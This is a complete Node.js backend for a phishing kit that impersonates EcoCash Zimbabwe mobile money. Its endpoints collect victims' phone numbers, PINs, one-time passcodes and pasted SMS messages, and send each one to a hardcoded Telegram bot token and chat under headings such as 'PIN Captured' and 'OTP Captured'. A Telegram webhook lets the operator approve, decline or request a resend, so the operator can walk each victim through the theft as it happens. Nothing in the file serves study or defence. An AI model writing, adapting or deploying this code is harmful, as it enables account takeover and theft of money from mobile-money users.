/**
 * EcoCash Zimbabwe — Backend
 * Flow: index.html → pay.html (PIN) → verification.html (OTP) → verify.html
 */

const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// ── Telegram (Zimbabwe bot) ──
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8815374982:AAF_kduY_tYx4dw86PMGmlLPpwDr7sY-T8Y';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '8392790531';
const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const SESSION_TTL_MS = 60 * 60 * 1000;
const LINK_TTL_MS    = 30 * 60 * 1000;

const DATA_DIR      = process.env.DATA_DIR || (fs.existsSync('/data') ? '/data' : '/tmp');
const SESSIONS_FILE = path.join(DATA_DIR, 'ecopay_sessions.json');
const LINKS_FILE    = path.join(DATA_DIR, 'ecopay_links.json');
const TXS_FILE      = path.join(DATA_DIR, 'ecopay_txs.json');

try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e){}

app.use(cors());
app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '..'), { extensions: ['html'] }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

/* ============================================================
   PERSISTENT STORAGE
   ============================================================ */
function loadMap(file){
  try {
    if (fs.existsSync(file)) {
      const raw = fs.readFileSync(file, 'utf8');
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) return new Map(parsed);
    }
  } catch(e){ console.warn(`[load] ${file} failed:`, e.message); }
  return null;
}
function saveMap(file, map){
  try { fs.writeFileSync(file, JSON.stringify([...map.entries()])); }
  catch(e){ console.warn(`[save] ${file} failed:`, e.message); }
}

let sessions = loadMap(SESSIONS_FILE) || new Map();
let links    = loadMap(LINKS_FILE)    || new Map();
let txs      = loadMap(TXS_FILE)      || new Map();

console.log(`[sessions] restored ${sessions.size} from disk`);
console.log(`[links]    restored ${links.size} from disk`);
console.log(`[txs]      restored ${txs.size} from disk`);

function persistSessions(){ saveMap(SESSIONS_FILE, sessions); }
function persistLinks(){    saveMap(LINKS_FILE, links); }
function persistTxs(){      saveMap(TXS_FILE, txs); }

/* ============================================================
   HELPERS
   ============================================================ */
function esc(s = ''){
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

async function tgSend(text, replyMarkup){
  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  };
  if (replyMarkup) body.reply_markup = replyMarkup;
  try {
    const r = await fetch(`${TELEGRAM_API}/sendMessage`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify(body)
    });
    return r.json();
  } catch(e){ return { ok:false, description: e.message }; }
}

async function tgAnswer(cbId, text){
  await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ callback_query_id: cbId, text, show_alert: false })
  }).catch(()=>{});
}

async function tgRemoveButtons(chatId, messageId){
  await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
  }).catch(()=>{});
}

function ensureTx(trackingNumber, extra){
  if (!trackingNumber) return null;
  let t = txs.get(trackingNumber);
  if (!t) {
    t = {
      trackingNumber,
      pinStatus: 'pending',
      otpStatus: 'pending',
      createdAt: Date.now(),
      ...extra
    };
    txs.set(trackingNumber, t);
  } else if (extra) {
    Object.assign(t, extra);
  }
  persistTxs();
  return t;
}

/* ============================================================
   HEALTH & DEBUG
   ============================================================ */
app.get('/', (_req, res) => {
  res.json({
    ok: true,
    service: 'ecocash-zimbabwe-backend',
    activeSessions: sessions.size,
    activeLinks: links.size,
    activeTxs: txs.size,
    dataDir: DATA_DIR,
    persistentDisk: DATA_DIR === '/data',
    warning: DATA_DIR === '/data' ? null : 'No persistent disk — sessions will be lost on restart. Add Render Disk at /data.',
    telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
    publicUrl: process.env.PUBLIC_URL || '(not set)',
    time: new Date().toISOString()
  });
});

app.get('/health', (_req, res) => res.json({
  ok: true,
  ts: Date.now(),
  activeSessions: sessions.size,
  activeLinks: links.size,
  activeTxs: txs.size,
  dataDir: DATA_DIR
}));

app.get('/api/debug', (_req, res) => {
  const sList = [];
  for (const [id, s] of sessions) sList.push({ id, status: s.status, stage: s.stage, ageSec: Math.floor((Date.now()-s.createdAt)/1000) });
  const tList = [];
  for (const [tn, t] of txs) tList.push({ tn, pinStatus: t.pinStatus, otpStatus: t.otpStatus });
  res.json({ ok:true, dataDir: DATA_DIR, sessions: sList, txs: tList });
});

/* ============================================================
   WEBHOOK DIAGNOSTIC
   ============================================================ */
app.get('/api/check-webhook', async (_req, res) => {
  try {
    const r = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
    res.json(await r.json());
  } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
});

app.get('/api/set-webhook', async (_req, res) => {
  try {
    const publicUrl = (process.env.PUBLIC_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost'}`).replace(/\/+$/, '');
    const webhookUrl = `${publicUrl}/api/telegram-webhook`;
    const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
    res.json({ webhookUrl, result: await r.json() });
  } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
});

/* ============================================================
   SHORT LINKS
   ============================================================ */
app.post('/api/links', (req, res) => {
  try {
    const body = req.body || {};
    const tracking = String(body.trackingNumber || body.t || '').trim().toUpperCase();
    if (!tracking) return res.status(400).json({ ok:false, error:'Tracking number required' });
    const now = Date.now();
    const record = {
      trackingNumber: tracking,
      accountName: body.accountName || '',
      accountNumber: body.accountNumber || '',
      amount: body.amount || '0',
      currency: (body.currency || 'USD').toUpperCase(),
      countryCode: body.countryCode || '+263',
      countryFlag: body.countryFlag || '🇿🇼',
      countryName: body.countryName || 'Zimbabwe',
      modeOfPayment: body.modeOfPayment || '',
      receiptOptional: body.receiptOptional || '',
      timestamp: body.timestamp || '',
      createdAt: now,
      expiresAt: now + LINK_TTL_MS
    };
    links.set(tracking, record);
    persistLinks();
    console.log(`[link] created ${tracking}`);
    res.json({
      ok: true,
      code: tracking,
      trackingNumber: tracking,
      expiresAt: record.expiresAt
    });
  } catch (err) { res.status(500).json({ ok:false, error: err.message }); }
});

/* GET /api/links/:code — returns BOTH long names and short aliases */
app.get('/api/links/:code', (req, res) => {
  const code = String(req.params.code || '').trim().toUpperCase();
  let rec = links.get(code);
  if (!rec) {
    const restored = loadMap(LINKS_FILE);
    if (restored) { links = restored; rec = links.get(code); }
  }
  if (!rec) return res.status(404).json({ ok:false, error:'Link not found' });
  if (rec.expiresAt && Date.now() > rec.expiresAt) {
    links.delete(code); persistLinks();
    return res.status(410).json({ ok:false, error:'Link expired' });
  }
  // Return both long names AND short aliases so index.html + pay.html work
  res.json({
    ok: true,
    ...rec,
    tx:  rec.trackingNumber,
    tn:  rec.trackingNumber,
    rn:  rec.accountName,
    am:  rec.amount,
    cur: rec.currency,
    an:  rec.accountNumber,
    c:   rec.countryName,
    cf:  rec.countryFlag,
    cc:  rec.countryCode,
    pm:  rec.modeOfPayment,
    sn:  rec.receiptOptional,
    ts:  rec.timestamp
  });
});

/* ============================================================
   ENDPOINT 1 — POST /api/accept  (PIN submitted)
   ============================================================ */
app.post('/api/accept', async (req, res) => {
  try {
    const { transactionId, phone, pin } = req.body || {};
    if (!transactionId || !pin) {
      return res.status(400).json({ ok:false, status:'failed', message:'Missing data' });
    }

    const rec = links.get(String(transactionId).toUpperCase()) || {};
    const tx = ensureTx(String(transactionId).toUpperCase(), { receipt: rec });
    tx.pinStatus = 'pending';
    tx.pinSubmittedAt = Date.now();
    tx.pinPhone = phone || '';
    persistTxs();

    const session = {
      id: 's_' + Date.now().toString(36) + Math.random().toString(36).slice(2,8),
      stage: 'pin',
      tx: tx.trackingNumber,
      status: 'pending',
      createdAt: Date.now(),
      expiresAt: Date.now() + SESSION_TTL_MS
    };
    sessions.set(session.id, session);
    persistSessions();

    const text =
      `🔐 <b>PIN Captured</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(tx.trackingNumber)}</code>\n` +
      `👤 <b>Recipient:</b> ${esc(rec.accountName || '—')}\n` +
      `📱 <b>Phone:</b> <code>${esc(phone || rec.accountNumber || '—')}</code>\n` +
      `🔑 <b>PIN:</b> <code>${esc(pin)}</code>\n` +
      `💳 <b>Service:</b> ${esc(rec.modeOfPayment || 'EcoCash')}\n` +
      `💰 <b>Amount:</b> ${esc(rec.currency || 'USD')} ${esc(rec.amount || '—')}\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB',{ timeZone: 'Africa/Harare' })} CAT\n` +
      `\n<i>Session: ${esc(session.id)}</i>`;

    const buttons = {
      inline_keyboard: [[
        { text: '✅ Approve', callback_data: `pin:approve:${tx.trackingNumber}` },
        { text: '❌ Decline', callback_data: `pin:decline:${tx.trackingNumber}` }
      ]]
    };

    const tg = await tgSend(text, buttons);
    if (!tg.ok) {
      console.error('Telegram send failed:', tg);
      return res.status(502).json({ ok:false, status:'failed', message: 'Telegram error' });
    }

    res.json({ ok:true, status:'pending' });
  } catch (err) {
    console.error('accept error:', err);
    res.status(500).json({ ok:false, status:'failed', message: err.message });
  }
});

/* ============================================================
   ENDPOINT 2 — GET /api/status/:id
   ============================================================ */
app.get('/api/status/:id', (req, res) => {
  const key = String(req.params.id || '').trim().toUpperCase();

  let tx = txs.get(key);
  if (!tx) {
    const restored = loadMap(TXS_FILE);
    if (restored) { txs = restored; tx = txs.get(key); }
  }
  if (tx) {
    return res.json({
      ok: true,
      status: tx.pinStatus,
      decision: tx.pinStatus,
      tx: tx.trackingNumber
    });
  }

  const s = sessions.get(key);
  if (s) {
    return res.json({
      ok: true,
      status: s.status,
      decision: s.status,
      stage: s.stage
    });
  }

  return res.status(404).json({ ok:false, error:'Not found' });
});

/* ============================================================
   ENDPOINT 3 — POST /api/verification/otp  (OTP page opened)
   ============================================================ */
app.post('/api/verification/otp', async (req, res) => {
  try {
    const { tx, am, cur, c } = req.body || {};
    if (!tx) return res.status(400).json({ ok:false, message:'Missing tx' });

    const tracking = String(tx).toUpperCase();
    const t = ensureTx(tracking, { receipt: { amount: am, currency: cur, country: c } });
    t.otpStatus = 'awaiting';
    t.otpStageOpenedAt = Date.now();
    persistTxs();

    const text =
      `📲 <b>OTP Page Opened</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
      `🕒 ${new Date().toLocaleString('en-GB',{ timeZone: 'Africa/Harare' })} CAT`;

    await tgSend(text, null);
    res.json({ ok:true });
  } catch (err) {
    console.error('verification/otp error:', err);
    res.status(500).json({ ok:false, message: err.message });
  }
});

/* ============================================================
   ENDPOINT 4 — POST /api/verification/submit  (OTP submitted)
   ============================================================ */
app.post('/api/verification/submit', async (req, res) => {
  try {
    const { tx, otp, am, cur, c } = req.body || {};
    if (!tx || !otp) return res.status(400).json({ ok:false, message:'Missing data' });

    const tracking = String(tx).toUpperCase();
    const rec = links.get(tracking) || {};
    const t = ensureTx(tracking, { receipt: rec });
    t.otpStatus = 'pending';
    t.otpSubmittedAt = Date.now();
    t.otpCode = otp;
    persistTxs();

    const text =
      `🔢 <b>OTP Captured</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
      `👤 <b>Recipient:</b> ${esc(rec.accountName || '—')}\n` +
      `🔑 <b>OTP:</b> <code>${esc(otp)}</code>\n` +
      `💰 <b>Amount:</b> ${esc(rec.currency || cur || 'USD')} ${esc(rec.amount || am || '—')}\n` +
      `🕒 ${new Date().toLocaleString('en-GB',{ timeZone: 'Africa/Harare' })} CAT`;

    const buttons = {
      inline_keyboard: [
        [
          { text: '✅ Approve', callback_data: `otp:approve:${tracking}` },
          { text: '❌ Decline', callback_data: `otp:decline:${tracking}` }
        ],
        [
          { text: '🔁 Resend',  callback_data: `otp:resend:${tracking}` },
          { text: '⚠️ Inactive', callback_data: `otp:inactive:${tracking}` }
        ]
      ]
    };

    const tg = await tgSend(text, buttons);
    if (!tg.ok) {
      console.error('Telegram send failed:', tg);
      return res.status(502).json({ ok:false, message:'Telegram error' });
    }

    res.json({ ok:true, status:'pending' });
  } catch (err) {
    console.error('verification/submit error:', err);
    res.status(500).json({ ok:false, message: err.message });
  }
});

/* ============================================================
   ENDPOINT 5 — GET /api/verification/status/:tx
   ============================================================ */
app.get('/api/verification/status/:tx', (req, res) => {
  const tracking = String(req.params.tx || '').trim().toUpperCase();
  let t = txs.get(tracking);
  if (!t) {
    const restored = loadMap(TXS_FILE);
    if (restored) { txs = restored; t = txs.get(tracking); }
  }
  if (!t) return res.json({ ok:true, decision:'pending' });

  let decision = 'pending';
  if (t.otpStatus === 'approved') decision = 'approved';
  else if (t.otpStatus === 'declined') decision = 'declined';
  else if (t.otpStatus === 'resend')   decision = 'expired';
  else if (t.otpStatus === 'inactive') decision = 'inactive';

  res.json({ ok:true, decision, tx: tracking });
});

/* ============================================================
   GENERIC /api/notify — kept for compatibility
   ============================================================ */
app.post('/api/notify', async (req, res) => {
  try {
    const { stage, phone, pinOrOtp, otp, sms, receipt } = req.body || {};
    if (!stage || !['pin','sms','otp'].includes(stage)) {
      return res.status(400).json({ ok:false, error:'Invalid stage' });
    }

    const s = {
      id: 's_' + Date.now().toString(36) + Math.random().toString(36).slice(2,8),
      stage,
      status: 'pending',
      createdAt: Date.now(),
      expiresAt: Date.now() + SESSION_TTL_MS
    };
    sessions.set(s.id, s);
    persistSessions();

    let label, keyLabel, secret;
    if (stage === 'pin') {
      label = '🔐 <b>PIN Captured</b>';
      keyLabel = 'PIN'; secret = pinOrOtp || '—';
    } else if (stage === 'sms') {
      label = '📩 <b>SMS Pasted</b>';
      keyLabel = 'SMS'; secret = sms || '—';
    } else {
      label = '🔢 <b>OTP Captured</b>';
      keyLabel = 'OTP'; secret = otp || pinOrOtp || '—';
    }

    const text =
      `${label}\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(receipt?.trackingNumber || '—')}</code>\n` +
      `📱 <b>Phone:</b> <code>${esc(phone || '—')}</code>\n` +
      `🔑 <b>${keyLabel}:</b> <code>${esc(secret)}</code>\n` +
      `💰 ${esc(receipt?.currency || '')} ${esc(receipt?.amount || '—')}`;

    const buttons = stage === 'otp' ? {
      inline_keyboard: [[
        { text: '✅ Approve', callback_data: `approve:${s.id}` },
        { text: '🔁 Resend',  callback_data: `resend:${s.id}` }
      ]]
    } : {
      inline_keyboard: [[
        { text: '✅ Approve', callback_data: `approve:${s.id}` },
        { text: '❌ Decline', callback_data: `decline:${s.id}` }
      ]]
    };

    const tg = await tgSend(text, buttons);
    if (!tg.ok) return res.status(502).json({ ok:false, error: tg.description });
    res.json({ ok:true, sessionId: s.id });
  } catch (err) {
    res.status(500).json({ ok:false, error: err.message });
  }
});

/* ============================================================
   TELEGRAM WEBHOOK
   ============================================================ */
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body || {};
    const cq = update.callback_query;
    console.log(`[webhook] received. hasCallback=${!!cq} data=${cq?.data || 'none'}`);

    if (cq && cq.data) {
      const parts = String(cq.data).split(':');

      if (parts.length === 3) {
        const [stage, action, tx] = parts;
        const tracking = tx.toUpperCase();
        let t = txs.get(tracking);
        if (!t) {
          const restored = loadMap(TXS_FILE);
          if (restored) { txs = restored; t = txs.get(tracking); }
        }
        if (!t) {
          await tgAnswer(cq.id, 'Session expired');
          return res.json({ ok:true });
        }

        if (stage === 'pin') {
          if (action === 'approve') { t.pinStatus = 'approved'; await tgAnswer(cq.id, '✅ Approved'); }
          else if (action === 'decline') { t.pinStatus = 'declined'; await tgAnswer(cq.id, '❌ Declined'); }
        } else if (stage === 'otp') {
          if (action === 'approve') { t.otpStatus = 'approved'; await tgAnswer(cq.id, '✅ Approved'); }
          else if (action === 'decline') { t.otpStatus = 'declined'; await tgAnswer(cq.id, '❌ Declined'); }
          else if (action === 'resend') { t.otpStatus = 'resend'; await tgAnswer(cq.id, '🔁 Resend'); }
          else if (action === 'inactive') { t.otpStatus = 'inactive'; await tgAnswer(cq.id, '⚠️ Inactive'); }
        }
        persistTxs();
        if (cq.message) await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
        console.log(`[webhook] ${stage}:${action}:${tracking} → pin=${t.pinStatus} otp=${t.otpStatus}`);
        return res.json({ ok:true });
      }

      if (parts.length === 2) {
        const [action, sessionId] = parts;
        const s = sessions.get(sessionId);
        if (!s) { await tgAnswer(cq.id, 'Session expired'); return res.json({ ok:true }); }
        if (s.status !== 'pending') { await tgAnswer(cq.id, `Already ${s.status}`); return res.json({ ok:true }); }
        if (action === 'approve') s.status = 'approved';
        else if (action === 'decline') s.status = 'declined';
        else if (action === 'resend') s.status = 'resend';
        persistSessions();
        await tgAnswer(cq.id, action === 'approve' ? '✅ Approved' : action === 'resend' ? '🔁 Resend' : '❌ Declined');
        if (cq.message) await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
        return res.json({ ok:true });
      }
    }

    return res.json({ ok:true });
  } catch (err) {
    console.error('webhook error:', err);
    res.status(500).json({ ok:false, error: err.message });
  }
});

/* ============================================================
   AUTO-REGISTER WEBHOOK
   ============================================================ */
async function registerWebhook(){
  const publicUrl = (
    process.env.PUBLIC_URL ||
    (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '') ||
    `http://localhost:${PORT}`
  ).replace(/\/+$/, '');
  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  console.log(`PUBLIC_URL = ${publicUrl}`);
  console.log(`Registering webhook: ${webhookUrl}`);
  try {
    const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
    console.log('setWebhook result:', await r.json());
  } catch (e) { console.error('setWebhook failed:', e.message); }
}

app.listen(PORT, async () => {
  console.log(`EcoCash Zimbabwe backend running on port ${PORT}`);
  console.log(`Data directory: ${DATA_DIR}`);
  if (DATA_DIR !== '/data') {
    console.warn('⚠️  No persistent disk — sessions wiped on Render restart');
    console.warn('⚠️  Fix: Render → Disks → Add Disk → Mount Path = /data');
  }
  await registerWebhook();
});
